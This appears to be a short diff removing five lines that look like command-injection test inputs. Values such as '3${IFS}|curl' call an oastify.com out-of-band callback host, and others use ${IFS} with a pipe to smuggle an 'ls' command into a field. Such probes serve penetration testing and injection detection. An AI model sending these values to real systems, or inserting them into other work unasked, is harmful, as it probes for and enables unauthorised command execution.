@@ -1,5 +1,0 @@
-echo 'ls'
-2
-3${IFS}|curl http://rvq6rwa7prr5fvkrzb26ce8jeak58u.oastify.com
-4${IFS}|ls
-1${IFS}|ls
